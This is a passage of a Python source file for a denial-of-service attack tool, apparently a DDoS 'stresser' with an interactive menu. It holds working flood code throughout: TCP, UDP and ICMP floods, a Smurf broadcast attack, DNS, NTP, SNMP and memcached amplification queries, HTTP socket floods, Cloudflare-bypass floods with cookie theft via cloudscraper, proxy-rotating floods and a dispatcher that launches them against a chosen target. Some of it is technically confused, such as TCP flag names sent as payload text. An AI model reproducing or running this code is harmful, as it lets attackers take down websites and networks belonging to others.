    global attack_running
    attack_running = True
    until = time.time() + duration
    
    def worker():
        while time.time() < until and attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, port))
                s.send(b'RST' * 1024)
                s.close()
                update_stats('RST', 1024, True)
            except:
                update_stats('RST', 0, False)
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_tcp_fin(ip: str, port: int, duration: int, threads: int):
    """TCP FIN flood."""
    global attack_running
    attack_running = True
    until = time.time() + duration
    
    def worker():
        while time.time() < until and attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, port))
                s.send(b'FIN' * 1024)
                s.close()
                update_stats('FIN', 1024, True)
            except:
                update_stats('FIN', 0, False)
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_tcp_xmas(ip: str, port: int, duration: int, threads: int):
    """TCP XMAS tree flood."""
    global attack_running
    attack_running = True
    until = time.time() + duration
    
    def worker():
        while time.time() < until and attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((ip, port))
                s.send(b'FINURGPUSH' * 1024)
                s.close()
                update_stats('XMAS', 1024, True)
            except:
                update_stats('XMAS', 0, False)
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_udp_flood(ip: str, port: int, duration: int, threads: int):
    """UDP flood with random payload."""
    global attack_running
    attack_running = True
    until = time.time() + duration
    
    def worker():
        payload = generate_random_payload(random.randint(1024, 65535))
        while time.time() < until and attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(payload, (ip, port))
                s.close()
                update_stats('UDP', len(payload), True)
            except:
                update_stats('UDP', 0, False)
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_udp_fragment(ip: str, port: int, duration: int, threads: int):
    """UDP fragment flood."""
    global attack_running
    attack_running = True
    until = time.time() + duration
    
    def worker():
        while time.time() < until and attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                # Send fragments
                for _ in range(10):
                    fragment = generate_random_payload(random.randint(100, 500))
                    s.sendto(fragment, (ip, port))
                    time.sleep(0.001)
                s.close()
                update_stats('UDPFRAG', 1000, True)
            except:
                update_stats('UDPFRAG', 0, False)
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_icmp_flood(ip: str, duration: int, threads: int):
    """ICMP flood (ping flood)."""
    global attack_running
    attack_running = True
    until = time.time() + duration
    
    def worker():
        payload = generate_random_payload(1024)
        while time.time() < until and attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                # Create ICMP packet
                icmp_type = 8  # Echo request
                icmp_code = 0
                icmp_checksum = 0
                identifier = random.randint(1, 65535)
                sequence = random.randint(1, 65535)
                
                packet = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, identifier, sequence) + payload
                
                # Calculate checksum
                checksum = 0
                for i in range(0, len(packet), 2):
                    word = (packet[i] << 8) + (packet[i+1] if i+1 < len(packet) else 0)
                    checksum += word
                    checksum = (checksum & 0xFFFF) + (checksum >> 16)
                checksum = ~checksum & 0xFFFF
                packet = struct.pack('!BBHHH', icmp_type, icmp_code, checksum, identifier, sequence) + payload
                
                s.sendto(packet, (ip, 0))
                s.close()
                update_stats('ICMP', len(packet), True)
            except:
                update_stats('ICMP', 0, False)
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_icmp_smurf(ip: str, duration: int, threads: int):
    """Smurf attack — ICMP to broadcast address."""
    global attack_running
    attack_running = True
    until = time.time() + duration
    
    # Convert to broadcast address
    try:
        network = ipaddress.ip_network(f"{ip}/24", strict=False)
        broadcast = str(network.broadcast_address)
    except:
        broadcast = ip
    
    def worker():
        payload = generate_random_payload(1024)
        while time.time() < until and attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                s.sendto(payload, (broadcast, 0))
                s.close()
                update_stats('SMURF', len(payload), True)
            except:
                update_stats('SMURF', 0, False)
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

# ============================================================
# AMPLIFICATION ATTACKS
# ============================================================

def attack_dns_amplification(url: str, duration: int, threads: int):
    """DNS amplification attack."""
    global attack_running
    target = get_target(url)
    domain = target['host']
    attack_running = True
    until = time.time() + duration
    
    # Build DNS query
    query = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
    for part in domain.split('.'):
        query += len(part).to_bytes(1, 'big') + part.encode()
    query += b'\x00\x00\xff\x00\x01'
    
    def worker():
        resolver = random.choice(DNS_RESOLVERS)
        while time.time() < until and attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(2)
                s.sendto(query, (resolver, 53))
                try:
                    data, _ = s.recvfrom(4096)
                    update_stats('DNS-AMP', len(data), True)
                except:
                    update_stats('DNS-AMP', 0, False)
                s.close()
            except:
                update_stats('DNS-AMP', 0, False)
            time.sleep(random.uniform(0.001, 0.005))
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_ntp_amplification(duration: int, threads: int):
    """NTP amplification attack."""
    global attack_running
    attack_running = True
    until = time.time() + duration
    
    # NTP monlist query
    query = b'\x17\x00\x03\x2a' + b'\x00' * 4 + b'\x00' * 4 + b'\x00' * 4 + b'\x00' * 4
    
    def worker():
        server = random.choice(NTP_SERVERS)
        while time.time() < until and attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(2)
                s.sendto(query, (server, 123))
                try:
                    data, _ = s.recvfrom(4096)
                    update_stats('NTP-AMP', len(data), True)
                except:
                    update_stats('NTP-AMP', 0, False)
                s.close()
            except:
                update_stats('NTP-AMP', 0, False)
            time.sleep(random.uniform(0.001, 0.005))
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_snmp_amplification(duration: int, threads: int):
    """SNMP amplification attack."""
    global attack_running
    attack_running = True
    until = time.time() + duration
    
    # SNMP getbulk query
    query = b'\x30\x81\x9c\x02\x01\x00\x04\x06\x70\x75\x62\x6c\x69\x63\xa0\x81\x8f\x02\x04\x7f\x00\x00\x01\x02\x01\x00\x02\x01\x00\x30\x81\x80\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x01\x00\x05\x00\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x02\x00\x05\x00\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x03\x00\x05\x00\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x04\x00\x05\x00\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x05\x00\x05\x00\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x06\x00\x05\x00\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x07\x00\x05\x00\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x08\x00\x05\x00\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x09\x00\x05\x00\x30\x0c\x06\x08\x2b\x06\x01\x02\x01\x01\x0a\x00\x05\x00'
    
    def worker():
        server = random.choice(SNMP_SERVERS)
        server = server.replace('udp://', '').split(':')
        host = server[0]
        port = int(server[1]) if len(server) > 1 else 161
        
        while time.time() < until and attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(2)
                s.sendto(query, (host, port))
                try:
                    data, _ = s.recvfrom(4096)
                    update_stats('SNMP-AMP', len(data), True)
                except:
                    update_stats('SNMP-AMP', 0, False)
                s.close()
            except:
                update_stats('SNMP-AMP', 0, False)
            time.sleep(random.uniform(0.001, 0.005))
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_memcached_amplification(duration: int, threads: int):
    """Memcached amplification attack."""
    global attack_running
    attack_running = True
    until = time.time() + duration
    
    # Memcached get query
    query = b'\x00\x01\x00\x00\x00\x01\x00\x00stats\x00'
    
    def worker():
        server = random.choice(MEMCACHED_SERVERS)
        server = server.replace('udp://', '').split(':')
        host = server[0]
        port = int(server[1]) if len(server) > 1 else 11211
        
        while time.time() < until and attack_running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.settimeout(2)
                s.sendto(query, (host, port))
                try:
                    data, _ = s.recvfrom(4096)
                    update_stats('MEMCACHED-AMP', len(data), True)
                except:
                    update_stats('MEMCACHED-AMP', 0, False)
                s.close()
            except:
                update_stats('MEMCACHED-AMP', 0, False)
            time.sleep(random.uniform(0.001, 0.005))
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

# ============================================================
# SOCKET & PROTOCOL ATTACKS
# ============================================================

def attack_socket_flood(url: str, duration: int, threads: int):
    """Raw socket flood with HTTP requests."""
    global attack_running
    target = get_target(url)
    attack_running = True
    until = time.time() + duration
    
    request = (
        f"GET {target['uri']} HTTP/1.1\r\n"
        f"Host: {target['host']}\r\n"
        f"User-Agent: {random.choice(ua)}\r\n"
        f"Accept: */*\r\n"
        f"Connection: Keep-Alive\r\n"
        f"\r\n"
    )
    
    def worker():
        while time.time() < until and attack_running:
            try:
                if target['scheme'] == 'https':
                    s = socks.socksocket()
                    s.settimeout(config.timeout)
                    s.connect((target['host'], int(target['port'])))
                    s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
                else:
                    s = socks.socksocket()
                    s.settimeout(config.timeout)
                    s.connect((target['host'], int(target['port'])))
                
                for _ in range(random.randint(10, 100)):
                    s.send(request.encode())
                s.close()
                update_stats('SOCKET', len(request) * 10, True)
            except:
                update_stats('SOCKET', 0, False)
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_spoof_flood(url: str, duration: int, threads: int):
    """HTTP flood with spoofed headers."""
    global attack_running
    target = get_target(url)
    attack_running = True
    until = time.time() + duration
    
    def worker():
        session = requests.Session()
        while time.time() < until and attack_running:
            try:
                headers = generate_spoofed_headers(target)
                headers['User-Agent'] = random.choice(ua)
                response = session.get(url, headers=headers, timeout=config.timeout)
                update_stats('SPOOF', len(response.content), response.status_code == 200)
            except:
                update_stats('SPOOF', 0, False)
            time.sleep(random.uniform(0.001, 0.01))
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_cloudflare_bypass(url: str, duration: int, threads: int):
    """Cloudflare bypass using cloudscraper."""
    global attack_running
    attack_running = True
    until = time.time() + duration
    
    def worker():
        scraper = cloudscraper.create_scraper()
        while time.time() < until and attack_running:
            try:
                headers = {'User-Agent': random.choice(ua)}
                response = scraper.get(url, headers=headers, timeout=config.timeout)
                update_stats('CFBYPASS', len(response.content), response.status_code == 200)
            except:
                update_stats('CFBYPASS', 0, False)
            time.sleep(random.uniform(0.001, 0.01))
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_cloudflare_socket(url: str, duration: int, threads: int):
    """Cloudflare bypass with socket and cookies."""
    global attack_running
    target = get_target(url)
    attack_running = True
    until = time.time() + duration
    
    # Try to get cookies first
    cookies = {}
    try:
        scraper = cloudscraper.create_scraper()
        resp = scraper.get(url)
        cookies = resp.cookies.get_dict()
    except:
        pass
    
    request = (
        f"GET {target['uri']} HTTP/1.1\r\n"
        f"Host: {target['host']}\r\n"
        f"User-Agent: {random.choice(ua)}\r\n"
        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        f"Connection: keep-alive\r\n"
        f"Cookie: {'; '.join([f'{k}={v}' for k, v in cookies.items()])}\r\n"
        f"\r\n"
    )
    
    def worker():
        while time.time() < until and attack_running:
            try:
                if target['scheme'] == 'https':
                    s = socks.socksocket()
                    s.settimeout(config.timeout)
                    s.connect((target['host'], int(target['port'])))
                    s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
                else:
                    s = socks.socksocket()
                    s.settimeout(config.timeout)
                    s.connect((target['host'], int(target['port'])))
                
                for _ in range(random.randint(10, 50)):
                    s.send(request.encode())
                s.close()
                update_stats('CFSOC', len(request) * 10, True)
            except:
                update_stats('CFSOC', 0, False)
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_pps_flood(url: str, duration: int, threads: int):
    """Packets per second flood."""
    global attack_running
    target = get_target(url)
    attack_running = True
    until = time.time() + duration
    
    request = f"GET / HTTP/1.1\r\nHost: {target['host']}\r\n\r\n"
    
    def worker():
        while time.time() < until and attack_running:
            try:
                if target['scheme'] == 'https':
                    s = socks.socksocket()
                    s.settimeout(1)
                    s.connect((target['host'], int(target['port'])))
                    s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
                else:
                    s = socks.socksocket()
                    s.settimeout(1)
                    s.connect((target['host'], int(target['port'])))
                
                # Send as fast as possible
                for _ in range(100):
                    s.send(request.encode())
                s.close()
                update_stats('PPS', len(request) * 100, True)
            except:
                update_stats('PPS', 0, False)
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_null_flood(url: str, duration: int, threads: int):
    """NULL header flood."""
    global attack_running
    target = get_target(url)
    attack_running = True
    until = time.time() + duration
    
    spoof_headers = generate_spoofed_headers(target)
    request = (
        f"GET {target['uri']} HTTP/1.1\r\n"
        f"Host: {target['host']}\r\n"
        f"User-Agent: null\r\n"
        f"Referer: null\r\n"
        f"X-Forwarded-For: {spoof_headers.get('X-Forwarded-For', '')}\r\n"
        f"X-Real-IP: {spoof_headers.get('X-Real-IP', '')}\r\n"
        f"Connection: Keep-Alive\r\n"
        f"\r\n"
    )
    
    def worker():
        while time.time() < until and attack_running:
            try:
                if target['scheme'] == 'https':
                    s = socks.socksocket()
                    s.settimeout(config.timeout)
                    s.connect((target['host'], int(target['port'])))
                    s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
                else:
                    s = socks.socksocket()
                    s.settimeout(config.timeout)
                    s.connect((target['host'], int(target['port'])))
                
                for _ in range(100):
                    s.send(request.encode())
                s.close()
                update_stats('NULL', len(request) * 100, True)
            except:
                update_stats('NULL', 0, False)
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

# ============================================================
# SPECIAL ATTACKS — SKY, STELLAR, TORNADO, HURRICANE, TSUNAMI, EARTHQUAKE
# ============================================================

def attack_sky(url: str, duration: int, threads: int):
    """SKY attack — mixed protocol with proxy."""
    global attack_running
    target = get_target(url)
    attack_running = True
    until = time.time() + duration
    
    request = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {target['host']}\r\n"
        f"User-Agent: {random.choice(ua)}\r\n"
        f"Cache-Control: no-cache\r\n"
        f"Accept: */*\r\n"
        f"Connection: Keep-Alive\r\n"
        f"\r\n"
    )
    
    def worker():
        while time.time() < until and attack_running:
            try:
                proxy_str = proxy_manager.get() if proxy_manager else None
                if proxy_str:
                    proxy = proxy_str.split(':')
                    if target['scheme'] == 'https':
                        s = socks.socksocket()
                        s.set_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
                        s.connect((target['host'], int(target['port'])))
                        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
                    else:
                        s = socks.socksocket()
                        s.set_proxy(socks.SOCKS5, proxy[0], int(proxy[1]))
                        s.connect((target['host'], int(target['port'])))
                else:
                    if target['scheme'] == 'https':
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((target['host'], int(target['port'])))
                        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
                    else:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect((target['host'], int(target['port'])))
                
                for _ in range(100):
                    s.send(request.encode())
                s.close()
                update_stats('SKY', len(request) * 100, True)
            except:
                update_stats('SKY', 0, False)
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_stellar(url: str, duration: int, threads: int):
    """STELLAR attack — pure socket speed."""
    global attack_running
    target = get_target(url)
    attack_running = True
    until = time.time() + duration
    
    request = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {target['host']}\r\n"
        f"User-Agent: {random.choice(ua)}\r\n"
        f"Cache-Control: no-cache\r\n"
        f"Connection: Keep-Alive\r\n"
        f"\r\n"
    )
    
    def worker():
        while time.time() < until and attack_running:
            try:
                if target['scheme'] == 'https':
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(config.timeout)
                    s.connect((target['host'], int(target['port'])))
                    s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(config.timeout)
                    s.connect((target['host'], int(target['port'])))
                
                for _ in range(200):
                    s.send(request.encode())
                s.close()
                update_stats('STELLAR', len(request) * 200, True)
            except:
                update_stats('STELLAR', 0, False)
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_tornado(url: str, duration: int, threads: int):
    """TORNADO attack — HTTP/2 + socket mixed."""
    global attack_running
    target = get_target(url)
    attack_running = True
    until = time.time() + duration
    
    request = (
        f"GET {target['uri']} HTTP/1.1\r\n"
        f"Host: {target['host']}\r\n"
        f"User-Agent: {random.choice(ua)}\r\n"
        f"Accept-Encoding: gzip, deflate, br\r\n"
        f"Connection: Keep-Alive\r\n"
        f"\r\n"
    )
    
    def worker():
        # Use both HTTP2 and socket
        http2_client = httpx.Client(http2=True, timeout=config.timeout)
        
        while time.time() < until and attack_running:
            try:
                # HTTP2 request
                try:
                    response = http2_client.get(url, headers={'User-Agent': random.choice(ua)})
                    update_stats('TORNADO', len(response.content), response.status_code == 200)
                except:
                    pass
                
                # Socket request
                try:
                    if target['scheme'] == 'https':
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(config.timeout)
                        s.connect((target['host'], int(target['port'])))
                        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
                    else:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(config.timeout)
                        s.connect((target['host'], int(target['port'])))
                    
                    for _ in range(50):
                        s.send(request.encode())
                    s.close()
                    update_stats('TORNADO', len(request) * 50, True)
                except:
                    update_stats('TORNADO', 0, False)
            except:
                pass
            time.sleep(random.uniform(0.001, 0.005))
        
        http2_client.close()
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_hurricane(url: str, duration: int, threads: int):
    """HURRICANE attack — multi-method flood."""
    global attack_running
    target = get_target(url)
    attack_running = True
    until = time.time() + duration
    
    methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS', 'PATCH']
    
    def worker():
        session = requests.Session()
        while time.time() < until and attack_running:
            try:
                method = random.choice(methods)
                headers = {'User-Agent': random.choice(ua)}
                
                if method == 'GET':
                    response = session.get(url, headers=headers, timeout=config.timeout)
                elif method == 'POST':
                    data = {'_': str(random.randint(1000, 9999))}
                    response = session.post(url, data=data, headers=headers, timeout=config.timeout)
                elif method == 'HEAD':
                    response = session.head(url, headers=headers, timeout=config.timeout)
                elif method == 'PUT':
                    data = generate_random_payload(1024)
                    response = session.put(url, data=data, headers=headers, timeout=config.timeout)
                elif method == 'DELETE':
                    response = session.delete(url, headers=headers, timeout=config.timeout)
                elif method == 'OPTIONS':
                    response = session.options(url, headers=headers, timeout=config.timeout)
                elif method == 'PATCH':
                    data = json.dumps({'value': random.randint(1000, 9999)})
                    response = session.patch(url, data=data, headers=headers, timeout=config.timeout)
                
                update_stats('HURRICANE', len(response.content) if hasattr(response, 'content') else 0, response.status_code in [200, 204, 302, 404])
            except:
                update_stats('HURRICANE', 0, False)
            time.sleep(random.uniform(0.001, 0.01))
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_tsunami(url: str, duration: int, threads: int):
    """TSUNAMI attack — maximum socket flood."""
    global attack_running
    target = get_target(url)
    attack_running = True
    until = time.time() + duration
    
    # Pre-build multiple request variations
    requests_list = []
    for _ in range(10):
        req = (
            f"GET {target['uri']} HTTP/1.1\r\n"
            f"Host: {target['host']}\r\n"
            f"User-Agent: {random.choice(ua)}\r\n"
            f"Accept: */*\r\n"
            f"Connection: Keep-Alive\r\n"
            f"\r\n"
        )
        requests_list.append(req)
    
    def worker():
        while time.time() < until and attack_running:
            try:
                if target['scheme'] == 'https':
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((target['host'], int(target['port'])))
                    s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((target['host'], int(target['port'])))
                
                # Send all requests
                for req in requests_list:
                    s.send(req.encode())
                
                s.close()
                update_stats('TSUNAMI', len(''.join(requests_list)), True)
            except:
                update_stats('TSUNAMI', 0, False)
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

def attack_earthquake(url: str, duration: int, threads: int):
    """EARTHQUAKE attack — massive parallel connections."""
    global attack_running
    target = get_target(url)
    attack_running = True
    until = time.time() + duration
    
    def worker():
        connections = []
        try:
            # Open multiple connections
            for _ in range(20):
                if target['scheme'] == 'https':
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((target['host'], int(target['port'])))
                    s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
                else:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((target['host'], int(target['port'])))
                connections.append(s)
            
            # Keep them alive and send data
            while time.time() < until and attack_running:
                for s in connections:
                    try:
                        s.send(f"GET {target['uri']} HTTP/1.1\r\nHost: {target['host']}\r\n\r\n".encode())
                    except:
                        pass
                time.sleep(0.001)
            
            # Clean up
            for s in connections:
                try:
                    s.close()
                except:
                    pass
            
            update_stats('EARTHQUAKE', 0, True)
        except:
            update_stats('EARTHQUAKE', 0, False)
    
    for _ in range(threads):
        t = threading.Thread(target=worker, daemon=True)
        t.start()
        active_threads.append(t)
    
    countdown(duration)
    attack_running = False

# ============================================================
# ATTACK DISPATCHER
# ============================================================

ATTACK_METHODS = {
    # Layer 7 HTTP
    'get': attack_http_get,
    'post': attack_http_post,
    'head': attack_http_head,
    'put': attack_http_put,
    'delete': attack_http_delete,
    'options': attack_http_options,
    'patch': attack_http_patch,
    'httpx': attack_http2_flood,
    'httpxp': attack_http2_proxy_flood,
    
    # Slow attacks
    'slowloris': attack_slowloris,
    'slowpost': attack_slowpost,
    'rudy': attack_rudy,
    
    # Layer 4 TCP
    'syn': attack_tcp_syn,
    'ack': attack_tcp_ack,
    'rst': attack_tcp_rst,
    'fin': attack_tcp_fin,
    'xmas': attack_tcp_xmas,
    
    # Layer 4 UDP
    'udp': attack_udp_flood,
    'udpfrag': attack_udp_fragment,
    
    # Layer 3 ICMP
    'icmp': attack_icmp_flood,
    'smurf': attack_icmp_smurf,
    
    # Amplification
    'dnsamp': attack_dns_amplification,
    'ntpamp': attack_ntp_amplification,
    'snmpamp': attack_snmp_amplification,
    'memcached': attack_memcached_amplification,
    
    # Socket/Protocol
    'soc': attack_socket_flood,
    'spoof': attack_spoof_flood,
    'bypass': attack_cloudflare_bypass,
    'cfsoc': attack_cloudflare_socket,
    'pps': attack_pps_flood,
    'null': attack_null_flood,
    
    # Special
    'sky': attack_sky,
    'stellar': attack_stellar,
    'tornado': attack_tornado,
    'hurricane': attack_hurricane,
    'tsunami': attack_tsunami,
    'earthquake': attack_earthquake,
}

def launch_attack(method: str, target: str, threads: int, duration: int):
    """Launch an attack with the specified method."""
    global attack_running, active_threads, attack_stats
    
    # Reset stats
    with stats_lock:
        attack_stats['total_requests'] = 0
        attack_stats['successful_requests'] = 0
        attack_stats['failed_requests'] = 0
        attack_stats['bytes_sent'] = 0
        attack_stats['start_time'] = time.time()
        attack_stats['end_time'] = None
        attack_stats['active_threads'] = threads
    
    active_threads = []
    print_attack_banner(method.upper(), target, threads, duration)
    
    try:
        if method in ['udp', 'udpfrag', 'syn', 'ack', 'rst', 'fin', 'xmas', 'icmp', 'smurf']:
            # Layer 3/4 attacks need IP and port
            parts = target.split(':')
            if len(parts) == 2:
                ip, port = parts
                port = int(port)
            else:
                ip = target
                port = 80
            
            if method in ['udp', 'udpfrag']:
                attack_udp_flood(ip, port, duration, int(threads))
            elif method in ['syn', 'ack', 'rst', 'fin', 'xmas']:
                attack_tcp_syn(ip, port, duration, int(threads))
            elif method in ['icmp', 'smurf']:
                attack_icmp_flood(ip, duration, int(threads))
        elif method in ['dnsamp', 'ntpamp', 'snmpamp', 'memcached']:
            # Amplification attacks
            if method == 'dnsamp':
                attack_dns_amplification(target, duration, int(threads))
            elif method == 'ntpamp':
                attack_ntp_amplification(duration, int(threads))
            elif method == 'snmpamp':
                attack_snmp_amplification(duration, int(threads))
            elif method == 'memcached':
                attack_memcached_amplification(duration, int(threads))
        else:
            # Layer 7 attacks
            if method in ATTACK_METHODS:
                ATTACK_METHODS[method](target, duration, int(threads))
            else:
                print(f"{Fore.RED}[!] Unknown method: {method}{Style.RESET_ALL}")
                return
    except Exception as e:
        print(f"{Fore.RED}[!] Attack error: {e}{Style.RESET_ALL}")
        logger.error(f"Attack error: {e}")
    
    # Clean up
    attack_running = False
    with stats_lock:
        attack_stats['end_time'] = time.time()
    
    print(f"\n{Fore.GREEN} Attack completed!{Style.RESET_ALL}")

# ============================================================
# INTERACTIVE SHELL
# ============================================================

def show_help():
    clear()
    help_text = f"""
{Fore.GREEN} ██████   ██████ ██████████ ██████   █████ █████  █████
{Fore.CYAN}░░██████ ██████ ░░███░░░░░█░░██████ ░░███ ░░███  ░░███ 
{Fore.GREEN} ░███░█████░███  ░███  █ ░  ░███░███ ░███  ░███   ░███ 
{Fore.CYAN} ░███░░███ ░███  ░██████    ░███░░███░███  ░███   ░███ 
{Fore.GREEN} ░███ ░░░  ░███  ░███░░█    ░███ ░░██████  ░███   ░███ 
{Fore.CYAN} ░███      ░███  ░███ ░   █ ░███  ░░█████  ░███   ░███ 
{Fore.GREEN} █████     █████ ██████████ █████  ░░█████ ░░████████  
{Fore.CYAN} ░░░░░     ░░░░░ ░░░░░░░░░░ ░░░░░    ░░░░░   ░░░░░░░░   
                                                       
{Fore.CYAN}                                                                                   
{Fore.CYAN}  {Fore.GREEN}LAYER 7 — HTTP/HTTPS Attacks{Fore.CYAN}                                              
{Fore.CYAN}    get        - HTTP GET flood (random parameters)                              
{Fore.CYAN}    post       - HTTP POST flood (random form data)                              
{Fore.CYAN}    head       - HTTP HEAD flood                                                 
{Fore.CYAN}    put        - HTTP PUT flood (random data)                                   
{Fore.CYAN}    delete     - HTTP DELETE flood                                               
{Fore.CYAN}    options    - HTTP OPTIONS flood                                              
{Fore.CYAN}    patch      - HTTP PATCH flood (JSON data)                                   
{Fore.CYAN}    httpx      - HTTP/2 flood                                                    
{Fore.CYAN}    httpxp     - HTTP/2 flood with proxy rotation                                
{Fore.CYAN}                                                                                   
{Fore.CYAN}  {Fore.YELLOW}SLOW ATTACKS{Fore.CYAN}                                                          
{Fore.CYAN}    slowloris  - Slowloris keep-alive (incomplete headers)                      
{Fore.CYAN}    slowpost   - Slow POST (send data slowly)                                   
{Fore.CYAN}    rudy       - R-U-Dead-Yet (byte-by-byte POST)                               
{Fore.CYAN}                                                                                   
{Fore.CYAN}  {Fore.RED}LAYER 4 — TCP/UDP Attacks{Fore.CYAN}                                              
{Fore.CYAN}    syn        - TCP SYN flood                                                    
{Fore.CYAN}    ack        - TCP ACK flood                                                    
{Fore.CYAN}    rst        - TCP RST flood                                                    
{Fore.CYAN}    fin        - TCP FIN flood                                                    
{Fore.CYAN}    xmas       - TCP XMAS tree flood                                              
{Fore.CYAN}    udp        - UDP flood (random payload)                                      
{Fore.CYAN}    udpfrag    - UDP fragment flood                                              
{Fore.CYAN}                                                                                   
